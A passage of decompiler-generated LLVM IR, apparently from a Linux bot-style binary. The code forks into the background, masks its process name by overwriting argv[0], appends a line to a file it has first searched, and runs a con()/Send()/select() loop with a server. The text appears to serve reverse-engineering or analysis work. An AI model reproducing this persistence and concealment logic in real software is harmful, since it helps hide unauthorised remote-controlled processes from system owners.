  store i32 %v6_8049692, i32* %eax.global-to-local, align 4
  %v8_80496d9 = inttoptr i32 %stack_var_-72.0 to i8*
  %tmp111 = inttoptr i32 %stack_var_-72.0 to i32*
  %v2_80496a7 = ptrtoint i32* %stack_var_-1680 to i32
  %tmp112 = bitcast i32* %stack_var_-1680 to i8*
  br label %dec_label_pc_80496d6.outer

dec_label_pc_804969c:                             ; preds = %dec_label_pc_80496d6
  store i32 %v2_80496a7, i32* %eax.global-to-local, align 4
  store i8* %tmp112, i8** %stack_var_-6832, align 4
  %v6_80496ae = call i32 @fgets(i8* %tmp112, i32 1024, i32 %stack_var_-72.0)
  store i8* %tmp110, i8** %stack_var_-6828, align 4
  store i32 %v2_80496a7, i32* %eax.global-to-local, align 4
  store i8* %tmp112, i8** %stack_var_-6832, align 4
  %v5_80496c7 = call i32 @strcasecmp(i8* %tmp112, i32 %v2_804968b)
  store i32 %v5_80496c7, i32* %eax.global-to-local, align 4
  %v1_80496cf = icmp eq i32 %v5_80496c7, 0
  %v1_80496d1 = icmp eq i1 %v1_80496cf, false
  br i1 %v1_80496d1, label %dec_label_pc_80496d6, label %dec_label_pc_80496d3

dec_label_pc_80496d3:                             ; preds = %dec_label_pc_804969c
  %v4_80496d3 = add i32 %stack_var_-52.0.ph, 1
  br label %dec_label_pc_80496d6.outer

dec_label_pc_80496d6.outer:                       ; preds = %dec_label_pc_80496d3, %dec_label_pc_804966d
  %stack_var_-52.0.ph = phi i32 [ %v4_80496d3, %dec_label_pc_80496d3 ], [ 0, %dec_label_pc_804966d ]
  br label %dec_label_pc_80496d6

dec_label_pc_80496d6:                             ; preds = %dec_label_pc_80496d6.outer, %dec_label_pc_804969c
  store i8* %v8_80496d9, i8** %stack_var_-6832, align 4
  %v3_80496dc = call i32 @feof(i32* %tmp111)
  store i32 %v3_80496dc, i32* %eax.global-to-local, align 4
  %v1_80496e4 = icmp eq i32 %v3_80496dc, 0
  br i1 %v1_80496e4, label %dec_label_pc_804969c, label %dec_label_pc_80496e8

dec_label_pc_80496e8:                             ; preds = %dec_label_pc_80496d6
  %v4_80496e8 = icmp eq i32 %stack_var_-52.0.ph, 0
  %v1_80496ec = icmp eq i1 %v4_80496e8, false
  store i8* %v8_80496d9, i8** %stack_var_-6832, align 4
  %v3_8049743 = call i32 @fclose(i32* %tmp111)
  store i32 %v3_8049743, i32* @eax, align 4
  br i1 %v1_80496ec, label %dec_label_pc_804975b, label %dec_label_pc_80496ee

dec_label_pc_80496ee:                             ; preds = %dec_label_pc_80496e8
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054436.306, i32 0, i32 0), i8** %stack_var_-6828, align 4
  store i32 %v3_80497049, i32* %tmp108, align 4
  %v5_8049707 = call i32 @fopen(i32 %v3_80497049, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054436.306, i32 0, i32 0))
  store i32 %v5_8049707, i32* @eax, align 4
  %v4_8049712 = icmp eq i32 %v5_8049707, 0
  br i1 %v4_8049712, label %dec_label_pc_804975b, label %dec_label_pc_8049718

dec_label_pc_8049718:                             ; preds = %dec_label_pc_80496ee
  %v8_804971b = inttoptr i32 %v5_8049707 to i8*
  store i8* %v8_804971b, i8** %stack_var_-6828, align 4
  store i32 %v2_804968b, i32* %eax.global-to-local, align 4
  store i8* %tmp110, i8** %stack_var_-6832, align 4
  %v5_8049725 = call i32 @fputs(i8* %tmp110, i32 %v5_8049707)
  store i32 %v5_8049725, i32* %eax.global-to-local, align 4
  store i8* %v8_804971b, i8** %stack_var_-6832, align 4
  %tmp113 = inttoptr i32 %v5_8049707 to i32*
  %v3_8049733 = call i32 @fclose(i32* %tmp113)
  store i32 %v3_8049733, i32* @eax, align 4
  br label %dec_label_pc_804975b

dec_label_pc_804974d:                             ; preds = %dec_label_pc_80495fa
  %v8_8049750 = inttoptr i32 %stack_var_-72.0 to i8*
  store i8* %v8_8049750, i8** %stack_var_-6832, align 4
  %tmp114 = inttoptr i32 %stack_var_-72.0 to i32*
  %v3_8049753 = call i32 @fclose(i32* %tmp114)
  store i32 %v3_8049753, i32* @eax, align 4
  br label %dec_label_pc_804975b

dec_label_pc_804975b:                             ; preds = %dec_label_pc_80496e8, %dec_label_pc_80496ee, %dec_label_pc_80495f0, %dec_label_pc_8049718, %dec_label_pc_804974d
  %v0_804975b = call i32 @fork()
  %v1_8049760 = icmp eq i32 %v0_804975b, 0
  br i1 %v1_8049760, label %dec_label_pc_804976e, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804975b
  store i8* null, i8** %stack_var_-6832, align 4
  %v2_8049769 = call i32 @exit(i32 0)
  store i32 %v2_8049769, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804976e

dec_label_pc_804976e:                             ; preds = %dec_label_pc_804975b, %dec_label_pc_8049764
  store i32 %v2_8049587, i32* %edx.global-to-local, align 4
  %v3_8049774 = load i32, i32* %v2_80495a8, align 4
  store i32 %v3_8049774, i32* %eax.global-to-local, align 4
  %v1_8049777 = inttoptr i32 %v3_8049774 to i32*
  %v2_8049777 = load i32, i32* %v1_8049777, align 4
  store i32 %v2_8049777, i32* %eax.global-to-local, align 4
  %v5_804977c = inttoptr i32 %v2_8049777 to i8*
  store i8* %v5_804977c, i8** %stack_var_-6832, align 4
  %v3_804977d = call i32 @strlen(i8* %v5_804977c)
  store i32 %v3_804977d, i32* %eax.global-to-local, align 4
  store i32 %v3_804977d, i32* %edx.global-to-local, align 4
  store i32 %v2_8049587, i32* %ecx.global-to-local, align 4
  %v3_804978d = load i32, i32* %v2_80495a8, align 4
  store i32 %v3_804978d, i32* %eax.global-to-local, align 4
  %v1_8049790 = inttoptr i32 %v3_804978d to i32*
  %v2_8049790 = load i32, i32* %v1_8049790, align 4
  store i32 %v2_8049790, i32* %eax.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054438.307, i32 0, i32 0), i8** %stack_var_-6828, align 4
  %v5_804979b = inttoptr i32 %v2_8049790 to i8*
  store i8* %v5_804979b, i8** %stack_var_-6832, align 4
  %v5_804979c = call i32 @strncpy(i32 %v2_8049790, i32 ptrtoint ([14 x i8]* @global_var_8054438.307 to i32), i32 %v3_804977d)
  store i32 %v5_804979c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80497ef

dec_label_pc_80497ad:                             ; preds = %dec_label_pc_80497ef
  %v2_80497b0 = mul i32 %storemerge21, 4
  store i32 %v2_80497b0, i32* %eax.global-to-local, align 4
  store i32 %v2_8049587, i32* %edx.global-to-local, align 4
  %v4_80497b9 = load i32, i32* %v2_80495a8, align 4
  %v5_80497b9 = add i32 %v4_80497b9, %v2_80497b0
  store i32 %v5_80497b9, i32* %eax.global-to-local, align 4
  %v1_80497bc = inttoptr i32 %v5_80497b9 to i32*
  %v2_80497bc = load i32, i32* %v1_80497bc, align 4
  store i32 %v2_80497bc, i32* %eax.global-to-local, align 4
  %v5_80497c1 = inttoptr i32 %v2_80497bc to i8*
  store i8* %v5_80497c1, i8** %stack_var_-6832, align 4
  %v3_80497c2 = call i32 @strlen(i8* %v5_80497c1)
  store i32 %v3_80497c2, i32* @edx, align 4
  store i32 %v2_80497b0, i32* %eax.global-to-local, align 4
  store i32 %v2_8049587, i32* %ecx.global-to-local, align 4
  %v4_80497d8 = load i32, i32* %v2_80495a8, align 4
  %v5_80497d8 = add i32 %v4_80497d8, %v2_80497b0
  store i32 %v5_80497d8, i32* %eax.global-to-local, align 4
  %v1_80497db = inttoptr i32 %v5_80497d8 to i32*
  %v2_80497db = load i32, i32* %v1_80497db, align 4
  store i32 %v2_80497db, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-6828, align 4
  %v5_80497e3 = inttoptr i32 %v2_80497db to i8*
  store i8* %v5_80497e3, i8** %stack_var_-6832, align 4
  %v6_80497e4 = call i32 @memset(i8* %v5_80497e3, i32 0, i32 %v3_80497c2)
  store i32 %v6_80497e4, i32* %eax.global-to-local, align 4
  %v4_80497ec = add i32 %storemerge21, 1
  br label %dec_label_pc_80497ef

dec_label_pc_80497ef:                             ; preds = %dec_label_pc_804976e, %dec_label_pc_80497ad
  %stack_var_-6824.0 = phi i32 [ %v3_804977d, %dec_label_pc_804976e ], [ %v3_80497c2, %dec_label_pc_80497ad ]
  %storemerge21 = phi i32 [ 1, %dec_label_pc_804976e ], [ %v4_80497ec, %dec_label_pc_80497ad ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  store i32 %v2_8049587, i32* @edx, align 4
  %v3_80497f8 = load i32, i32* %stack_var_4, align 4
  %v5_80497fa = icmp slt i32 %storemerge21, %v3_80497f8
  br i1 %v5_80497fa, label %dec_label_pc_80497ad, label %dec_label_pc_80497fc

dec_label_pc_80497fc:                             ; preds = %dec_label_pc_80497ef
  store i8* null, i8** %stack_var_-6832, align 4
  %v3_8049801 = call i32 @time(i32* null)
  store i32 %v3_8049801, i32* %eax.global-to-local, align 4
  store i32 %v3_8049801, i32* @ebx, align 4
  %v0_804980b = call i32 @getpid()
  store i32 %v0_804980b, i32* %eax.global-to-local, align 4
  %v0_8049810 = load i32, i32* @ebx, align 4
  %v2_8049810 = xor i32 %v0_8049810, %v0_804980b
  store i32 %v2_8049810, i32* @ebx, align 4
  %v0_8049812 = call i32 @getppid()
  %v0_8049817 = load i32, i32* @ebx, align 4
  %v2_8049817 = add i32 %v0_8049817, %v0_8049812
  store i32 %v2_8049817, i32* %eax.global-to-local, align 4
  %v5_804981d = inttoptr i32 %v2_8049817 to i8*
  store i8* %v5_804981d, i8** %stack_var_-6832, align 4
  %v2_804981e = call i32 @srand(i32 %v2_8049817)
  store i32 %v2_804981e, i32* %eax.global-to-local, align 4
  %v2_804982d = call i32 @makestring(i32 ptrtoint ([14 x i8]* @global_var_80543e1.295 to i32))
  %v2_804983b = ptrtoint i32* %stack_var_-390 to i32
  store i32 %v2_804983b, i32* %eax.global-to-local, align 4
  %tmp116 = bitcast i32* %stack_var_-390 to i8*
  store i8* %tmp116, i8** %stack_var_-6832, align 4
  %v4_8049842 = call i32 @strcpy(i32 %v2_804983b, i32 ptrtoint ([14 x i8]* @global_var_80543e1.295 to i32))
  %v8_804984d = inttoptr i32 %v2_804982d to i8*
  store i8* %v8_804984d, i8** %stack_var_-6828, align 4
  store i32 %v2_804983b, i32* %eax.global-to-local, align 4
  store i8* %tmp116, i8** %stack_var_-6832, align 4
  %v5_8049857 = call i32 @strcat(i8* %tmp116, i32 %v2_804982d)
  store i32 %v2_804983b, i32* %eax.global-to-local, align 4
  store i32 %v2_804983b, i32* @global_var_8056f34.280, align 4
  %v0_804986a = load i8*, i8** %stack_var_-6832, align 4
  %v1_804986a = ptrtoint i8* %v0_804986a to i32
  %v2_804986a = call i32 @makestring(i32 %v1_804986a)
  store i32 %v2_804986a, i32* %eax.global-to-local, align 4
  store i32 %v2_804986a, i32* @global_var_8056f2c.272, align 4
  %v0_8049874 = load i8*, i8** %stack_var_-6832, align 4
  %v1_8049874 = ptrtoint i8* %v0_8049874 to i32
  %v2_8049874 = call i32 @makestring(i32 %v1_8049874)
  store i32 %v2_8049874, i32* %eax.global-to-local, align 4
  store i32 %v2_8049874, i32* @global_var_8056f3c.308, align 4
  store i32 ptrtoint (i32* @global_var_8054446.309 to i32), i32* @global_var_8056f4c.275, align 4
  store i32 ptrtoint (i32* @global_var_8054448.310 to i32), i32* @global_var_8056f48.286, align 8
  store i32 ptrtoint (i32* @global_var_8054448.310 to i32), i32* @global_var_8056f30.311, align 16
  store i32 0, i32* @global_var_8056f40.301, align 64
  %v2_80498f3 = ptrtoint i32* %stack_var_-656 to i32
  %v2_8049965 = ptrtoint i32* %stack_var_-400 to i32
  %v2_8049ac6 = ptrtoint i32* %stack_var_-6800 to i32
  %tmp117 = bitcast i8** %stack_var_-20 to i32*
  %v2_8049b93 = ptrtoint i32* %stack_var_-2704 to i32
  %v2_8049bde = ptrtoint i32* %stack_var_-1680 to i32
  %tmp118 = bitcast i8** %stack_var_-24 to i32*
  %tmp119 = add i32 %v2_80498f3, 128
  br label %dec_label_pc_80498a6

dec_label_pc_80498a6:                             ; preds = %dec_label_pc_8049aba, %bb120, %dec_label_pc_8049c61, %dec_label_pc_80497fc
  %stack_var_-32.0 = phi i32 [ %tmp73, %dec_label_pc_80497fc ], [ %stack_var_-32.3.lcssa, %dec_label_pc_8049c61 ], [ %stack_var_-32.1, %bb120 ], [ %stack_var_-32.3.lcssa, %dec_label_pc_8049aba ]
  %v0_80498a6 = call i32 @con()
  %v0_80498ab = load i32, i32* @global_var_8056f30.311, align 16
  store i32 %v0_80498ab, i32* %eax.global-to-local, align 4
  %v0_80498b0 = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_80498b0, i32* @edx, align 4
  %v0_80498b6 = load i32, i32* @esp, align 4
  %v2_80498b9 = add i32 %v0_80498b6, -8
  %v3_80498b9 = inttoptr i32 %v2_80498b9 to i32*
  store i32 %v0_80498ab, i32* %v3_80498b9, align 4
  %v1_80498ba = add i32 %v0_80498b6, -12
  %v2_80498ba = inttoptr i32 %v1_80498ba to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8054449.312 to i32), i32* %v2_80498ba, align 4
  %v0_80498bf = load i32, i32* @edx, align 4
  %v2_80498bf = add i32 %v0_80498b6, -16
  %v3_80498bf = inttoptr i32 %v2_80498bf to i32*
  store i32 %v0_80498bf, i32* %v3_80498bf, align 4
  %v0_80498c0 = load i8*, i8** %stack_var_-6832, align 4
  %v1_80498c0 = ptrtoint i8* %v0_80498c0 to i32
  %v2_80498c0 = load i8*, i8** %stack_var_-6828, align 4
  %v3_80498c0 = ptrtoint i8* %v2_80498c0 to i32
  %v5_80498c0 = call i32 @Send(i32 %v1_80498c0, i32 %v3_80498c0, i32 %stack_var_-6824.0)
  %v0_80498c5 = load i32, i32* @esp, align 4
  %v0_80498c8 = load i32, i32* @global_var_8056f3c.308, align 4
  store i32 %v0_80498c8, i32* %eax.global-to-local, align 4
  %v0_80498cd = load i32, i32* @global_var_8056f2c.272, align 4
  store i32 %v0_80498cd, i32* @edx, align 4
  %v0_80498d3 = load i32, i32* @global_var_8056f34.280, align 4
  store i32 %v0_80498d3, i32* %ecx.global-to-local, align 4
  %v0_80498d9 = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_80498d9, i32* @ebx, align 4
  %v3_80498e2 = inttoptr i32 %v0_80498c5 to i32*
  store i32 %v0_80498c8, i32* %v3_80498e2, align 4
  %v0_80498e3 = load i32, i32* @edx, align 4
  %v2_80498e3 = add i32 %v0_80498c5, -4
  %v3_80498e3 = inttoptr i32 %v2_80498e3 to i32*
  store i32 %v0_80498e3, i32* %v3_80498e3, align 4
  %v0_80498e4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80498e4 = add i32 %v0_80498c5, -8
  %v3_80498e4 = inttoptr i32 %v2_80498e4 to i32*
  store i32 %v0_80498e4, i32* %v3_80498e4, align 4
  %v1_80498e5 = add i32 %v0_80498c5, -12
  %v2_80498e5 = inttoptr i32 %v1_80498e5 to i32*
  store i32 ptrtoint ([41 x i8]* @global_var_8054454.313 to i32), i32* %v2_80498e5, align 4
  %v0_80498ea = load i32, i32* @ebx, align 4
  %v2_80498ea = add i32 %v0_80498c5, -16
  %v3_80498ea = inttoptr i32 %v2_80498ea to i32*
  store i32 %v0_80498ea, i32* %v3_80498ea, align 4
  %v0_80498eb = load i8*, i8** %stack_var_-6832, align 4
  %v1_80498eb = ptrtoint i8* %v0_80498eb to i32
  %v2_80498eb = load i8*, i8** %stack_var_-6828, align 4
  %v3_80498eb = ptrtoint i8* %v2_80498eb to i32
  %v5_80498eb = call i32 @Send(i32 %v1_80498eb, i32 %v3_80498eb, i32 %stack_var_-6824.0)
  store i32 %v5_80498eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049905.lr.ph

dec_label_pc_8049905.lr.ph:                       ; preds = %bb124, %dec_label_pc_8049ae3, %dec_label_pc_8049c80, %dec_label_pc_8049c9f, %dec_label_pc_80498a6
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_80498a6 ], [ %stack_var_-32.3.lcssa, %dec_label_pc_8049c9f ], [ %stack_var_-32.3.lcssa, %dec_label_pc_8049c80 ], [ %stack_var_-32.3.lcssa, %dec_label_pc_8049ae3 ], [ %stack_var_-32.3.lcssa, %bb124 ]
  store i32 %v2_80498f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049905

dec_label_pc_8049905:                             ; preds = %dec_label_pc_8049905.lr.ph, %dec_label_pc_8049905
  %storemerge2033 = phi i32 [ 32, %dec_label_pc_8049905.lr.ph ], [ %v4_8049912, %dec_label_pc_8049905 ]
  %stack_var_-36.032 = phi i32 [ %v2_80498f3, %dec_label_pc_8049905.lr.ph ], [ %v4_804990e, %dec_label_pc_8049905 ]
  store i32 %stack_var_-36.032, i32* %eax.global-to-local, align 4
  %v1_8049908 = inttoptr i32 %stack_var_-36.032 to i32*
  store i32 0, i32* %v1_8049908, align 4
  %v4_804990e = add i32 %stack_var_-36.032, 4
  %v4_8049912 = add nsw i32 %storemerge2033, -1
  %v4_8049915 = icmp eq i32 %v4_8049912, 0
  %v1_8049919 = icmp eq i1 %v4_8049915, false
  br i1 %v1_8049919, label %dec_label_pc_8049905, label %dec_label_pc_804991b

dec_label_pc_804991b:                             ; preds = %dec_label_pc_8049905
  %v0_804991b = load i32, i32* @global_var_8056f38.296, align 8
  %v2_8049920 = udiv i32 %v0_804991b, 32
  store i32 %v2_8049920, i32* %eax.global-to-local, align 4
  store i32 %v2_8049920, i32* @ebx, align 4
  %v0_8049925 = load i32, i32* @ebp, align 4
  %v2_8049925 = mul nuw nsw i32 %v2_8049920, 4
  %v3_8049925 = add nsw i32 %v2_8049925, -648
  %v4_8049925 = add i32 %v3_8049925, %v0_8049925
  %v5_8049925 = inttoptr i32 %v4_8049925 to i32*
  %v6_8049925 = load i32, i32* %v5_8049925, align 4
  store i32 %v6_8049925, i32* %edx.global-to-local, align 4
  %v1_8049933 = urem i32 %v0_804991b, 32
  %v2_8049933 = icmp eq i32 %v1_8049933, 0
  store i32 %v1_8049933, i32* %ecx.global-to-local, align 4
  br i1 %v2_8049933, label %bb120, label %bb

bb:                                               ; preds = %dec_label_pc_804991b
  %v5_804993b = shl i32 1, %v1_8049933
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_804991b, %bb
  %storemerge = phi i32 [ %v5_804993b, %bb ], [ 1, %dec_label_pc_804991b ]
  %v0_804993d = phi i32 [ %v5_804993b, %bb ], [ 1, %dec_label_pc_804991b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804993d = or i32 %v0_804993d, %v6_8049925
  store i32 %v2_804993d, i32* %v5_8049925, align 4
  store i32 1200, i32* %stack_var_-400, align 4
  %v0_804995a = load i32, i32* @global_var_8056f38.296, align 8
  %v1_804995f = add i32 %v0_804995a, 1
  store i32 %v1_804995f, i32* %edx.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v2_804996b = add i32 %v0_8049962, -16
  %v3_804996b = inttoptr i32 %v2_804996b to i32*
  store i32 %v2_8049965, i32* %v3_804996b, align 4
  %v1_804996c = add i32 %v0_8049962, -20
  %v2_804996c = inttoptr i32 %v1_804996c to i32*
  store i32 0, i32* %v2_804996c, align 4
  %v1_804996e = add i32 %v0_8049962, -24
  %v2_804996e = inttoptr i32 %v1_804996e to i32*
  store i32 0, i32* %v2_804996e, align 4
  store i32 %v2_80498f3, i32* %eax.global-to-local, align 4
  %v2_8049976 = add i32 %v0_8049962, -28
  %v3_8049976 = inttoptr i32 %v2_8049976 to i32*
  store i32 %v2_80498f3, i32* %v3_8049976, align 4
  %v0_8049977 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049977 = add i32 %v0_8049962, -32
  %v3_8049977 = inttoptr i32 %v2_8049977 to i32*
  store i32 %v0_8049977, i32* %v3_8049977, align 4
  %v0_8049978 = load i32, i32* %stack_var_-400, align 4
  %v5_8049978 = call i32 @select(i32 %v0_8049978, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8049978, i32* %eax.global-to-local, align 4
  %v0_804997d = load i32, i32* @esp, align 4
  %v1_804997d = add i32 %v0_804997d, 32
  %tmp121 = icmp slt i32 %v5_8049978, 1
  br i1 %tmp121, label %dec_label_pc_80498a6, label %dec_label_pc_8049a84.preheader

dec_label_pc_8049a84.preheader:                   ; preds = %bb120
  %v0_8049a84149 = load i32, i32* @global_var_8056570.268, align 16
  store i32 %v0_8049a84149, i32* %eax.global-to-local, align 4
  %v10_8049a89151 = icmp eq i32 %v0_8049a84149, 0
  br i1 %v10_8049a89151, label %dec_label_pc_8049a92, label %dec_label_pc_8049994

dec_label_pc_8049994:                             ; preds = %dec_label_pc_8049a84.preheader, %dec_label_pc_8049a81
  %storemerge17160 = phi i32 [ %.pre, %dec_label_pc_8049a81 ], [ 0, %dec_label_pc_8049a84.preheader ]
  %stack_var_-32.3159 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8049a81 ], [ %stack_var_-32.1, %dec_label_pc_8049a84.preheader ]
  %v0_80499a6158 = phi i32 [ %v0_8049abf54, %dec_label_pc_8049a81 ], [ %v1_804997d, %dec_label_pc_8049a84.preheader ]
  %v2_8049997 = mul i32 %storemerge17160, 4
  store i32 %v2_8049997, i32* %edx.global-to-local, align 4
  %v0_804999c = load i32, i32* @global_var_8056f50.269, align 16
  %v2_80499a1 = add i32 %v0_804999c, %v2_8049997
  store i32 %v2_80499a1, i32* %eax.global-to-local, align 4
  %v1_80499a4 = inttoptr i32 %v2_80499a1 to i32*
  %v2_80499a4 = load i32, i32* %v1_80499a4, align 4
  store i32 %v2_80499a4, i32* %eax.global-to-local, align 4
  %v1_80499a9 = add i32 %v0_80499a6158, -8
  %v2_80499a9 = inttoptr i32 %v1_80499a9 to i32*
  store i32 1, i32* %v2_80499a9, align 4
  %v1_80499ab = add i32 %v0_80499a6158, -12
  %v2_80499ab = inttoptr i32 %v1_80499ab to i32*
  store i32 0, i32* %v2_80499ab, align 4
  %v0_80499ad = load i32, i32* %eax.global-to-local, align 4
  %v2_80499ad = add i32 %v0_80499a6158, -16
  %v3_80499ad = inttoptr i32 %v2_80499ad to i32*
  store i32 %v0_80499ad, i32* %v3_80499ad, align 4
  %v4_80499ae = call i32 @waitpid(i32 %storemerge17160, i32 0, i32 %tmp119, i32 %stack_var_-32.3159)
  store i32 %v4_80499ae, i32* %eax.global-to-local, align 4
  %v0_80499b3 = load i32, i32* @esp, align 4
  %tmp122 = icmp slt i32 %v4_80499ae, 1
  %.pre = add i32 %storemerge17160, 1
  br i1 %tmp122, label %dec_label_pc_8049a81, label %dec_label_pc_80499be

dec_label_pc_80499be:                             ; preds = %dec_label_pc_8049994
  %v0_80499ef134 = load i32, i32* @global_var_8056570.268, align 16
  %v10_80499f4135 = icmp ult i32 %.pre, %v0_80499ef134
  %v0_80499c7136 = load i32, i32* @global_var_8056f50.269, align 16
  %v1_80499cc137 = add i32 %v0_80499c7136, -4
  store i32 %v1_80499cc137, i32* %edx.global-to-local, align 4
  %v2_80499d2138 = mul i32 %.pre, 4
  store i32 %v2_80499d2138, i32* %eax.global-to-local, align 4
  %v2_80499d5139 = add i32 %v1_80499cc137, %v2_80499d2138
  br i1 %v10_80499f4135, label %dec_label_pc_80499c7, label %dec_label_pc_80499f9

dec_label_pc_80499c7:                             ; preds = %dec_label_pc_80499be, %dec_label_pc_80499c7
  %v2_80499d5143 = phi i32 [ %v2_80499d5, %dec_label_pc_80499c7 ], [ %v2_80499d5139, %dec_label_pc_80499be ]
  %v2_80499d2142 = phi i32 [ %v2_80499d2, %dec_label_pc_80499c7 ], [ %v2_80499d2138, %dec_label_pc_80499be ]
  %v0_80499c7141 = phi i32 [ %v0_80499c7, %dec_label_pc_80499c7 ], [ %v0_80499c7136, %dec_label_pc_80499be ]
  %storemerge19140 = phi i32 [ %v4_80499ec, %dec_label_pc_80499c7 ], [ %.pre, %dec_label_pc_80499be ]
  store i32 %v2_80499d5143, i32* %ecx.global-to-local, align 4
  store i32 %v2_80499d2142, i32* %edx.global-to-local, align 4
  %v2_80499e5 = add i32 %v0_80499c7141, %v2_80499d2142
  store i32 %v2_80499e5, i32* %eax.global-to-local, align 4
  %v1_80499e8 = inttoptr i32 %v2_80499e5 to i32*
  %v2_80499e8 = load i32, i32* %v1_80499e8, align 4
  %v2_80499ea = inttoptr i32 %v2_80499d5143 to i32*
  store i32 %v2_80499e8, i32* %v2_80499ea, align 4
  %v4_80499ec = add i32 %storemerge19140, 1
  %v0_80499ef = load i32, i32* @global_var_8056570.268, align 16
  %v10_80499f4 = icmp ult i32 %v4_80499ec, %v0_80499ef
  %v0_80499c7 = load i32, i32* @global_var_8056f50.269, align 16
  %v1_80499cc = add i32 %v0_80499c7, -4
  store i32 %v1_80499cc, i32* %edx.global-to-local, align 4
  %v2_80499d2 = mul i32 %v4_80499ec, 4
  store i32 %v2_80499d2, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499cc, %v2_80499d2
  br i1 %v10_80499f4, label %dec_label_pc_80499c7, label %dec_label_pc_80499f9

dec_label_pc_80499f9:                             ; preds = %dec_label_pc_80499c7, %dec_label_pc_80499be
  %storemerge19.lcssa = phi i32 [ %.pre, %dec_label_pc_80499be ], [ %v4_80499ec, %dec_label_pc_80499c7 ]
  %v2_80499d5.lcssa = phi i32 [ %v2_80499d5139, %dec_label_pc_80499be ], [ %v2_80499d5, %dec_label_pc_80499c7 ]
  %v1_8049a0a = inttoptr i32 %v2_80499d5.lcssa to i32*
  store i32 0, i32* %v1_8049a0a, align 4
  %v0_8049a10 = load i32, i32* @global_var_8056570.268, align 16
  %v1_8049a15 = add i32 %v0_8049a10, -1
  store i32 %v1_8049a15, i32* @global_var_8056570.268, align 16
  %v2_8049a21 = mul i32 %v0_8049a10, 4
  store i32 %v2_8049a21, i32* %eax.global-to-local, align 4
  %v0_8049a24 = load i32, i32* @esp, align 4
  %v2_8049a27 = add i32 %v0_8049a24, -16
  %v3_8049a27 = inttoptr i32 %v2_8049a27 to i32*
  store i32 %v2_8049a21, i32* %v3_8049a27, align 4
  %v1_8049a28 = call i32 @malloc(i32 %storemerge19.lcssa)
  %v0_8049a2d = load i32, i32* @esp, align 4
  %v1_8049a2d = add i32 %v0_8049a2d, 16
  %v0_8049a5e145 = load i32, i32* @global_var_8056570.268, align 16
  store i32 %v0_8049a5e145, i32* %eax.global-to-local, align 4
  %v10_8049a63146 = icmp eq i32 %v0_8049a5e145, 0
  br i1 %v10_8049a63146, label %dec_label_pc_8049a68, label %dec_label_pc_8049a3c

dec_label_pc_8049a3c:                             ; preds = %dec_label_pc_80499f9, %dec_label_pc_8049a3c
  %storemerge18147 = phi i32 [ %v4_8049a5b, %dec_label_pc_8049a3c ], [ 0, %dec_label_pc_80499f9 ]
  %v2_8049a3f = mul i32 %storemerge18147, 4
  %v5_8049a44 = add i32 %v2_8049a3f, %v1_8049a28
  store i32 %v5_8049a44, i32* %ecx.global-to-local, align 4
  store i32 %v2_8049a3f, i32* %edx.global-to-local, align 4
  %v0_8049a4f = load i32, i32* @global_var_8056f50.269, align 16
  %v2_8049a54 = add i32 %v0_8049a4f, %v2_8049a3f
  store i32 %v2_8049a54, i32* %eax.global-to-local, align 4
  %v1_8049a57 = inttoptr i32 %v2_8049a54 to i32*
  %v2_8049a57 = load i32, i32* %v1_8049a57, align 4
  %v2_8049a59 = inttoptr i32 %v5_8049a44 to i32*
  store i32 %v2_8049a57, i32* %v2_8049a59, align 4
  %v4_8049a5b = add i32 %storemerge18147, 1
  %v0_8049a5e = load i32, i32* @global_var_8056570.268, align 16
  store i32 %v0_8049a5e, i32* %eax.global-to-local, align 4
  %v10_8049a63 = icmp ult i32 %v4_8049a5b, %v0_8049a5e
  br i1 %v10_8049a63, label %dec_label_pc_8049a3c, label %dec_label_pc_8049a5e.dec_label_pc_8049a68_crit_edge

dec_label_pc_8049a5e.dec_label_pc_8049a68_crit_edge: ; preds = %dec_label_pc_8049a3c
  %v0_8049a6d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a68

dec_label_pc_8049a68:                             ; preds = %dec_label_pc_80499f9, %dec_label_pc_8049a5e.dec_label_pc_8049a68_crit_edge
  %v0_8049a6d = phi i32 [ %v0_8049a6d.pre, %dec_label_pc_8049a5e.dec_label_pc_8049a68_crit_edge ], [ %v1_8049a2d, %dec_label_pc_80499f9 ]
  %storemerge18.lcssa = phi i32 [ %v4_8049a5b, %dec_label_pc_8049a5e.dec_label_pc_8049a68_crit_edge ], [ 0, %dec_label_pc_80499f9 ]
  %v0_8049a68 = load i32, i32* @global_var_8056f50.269, align 16
  store i32 %v0_8049a68, i32* @eax, align 4
  %v2_8049a70 = add i32 %v0_8049a6d, -16
  %v3_8049a70 = inttoptr i32 %v2_8049a70 to i32*
  store i32 %v0_8049a68, i32* %v3_8049a70, align 4
  %v1_8049a71 = call i32 @free(i32 %storemerge18.lcssa)
  %v0_8049a76 = load i32, i32* @esp, align 4
  store i32 %v1_8049a28, i32* %eax.global-to-local, align 4
  store i32 %v1_8049a28, i32* @global_var_8056f50.269, align 16
  br label %dec_label_pc_8049a81

dec_label_pc_8049a81:                             ; preds = %dec_label_pc_8049994, %dec_label_pc_8049a68
  %v0_8049abf54.in = phi i32 [ %v0_8049a76, %dec_label_pc_8049a68 ], [ %v0_80499b3, %dec_label_pc_8049994 ]
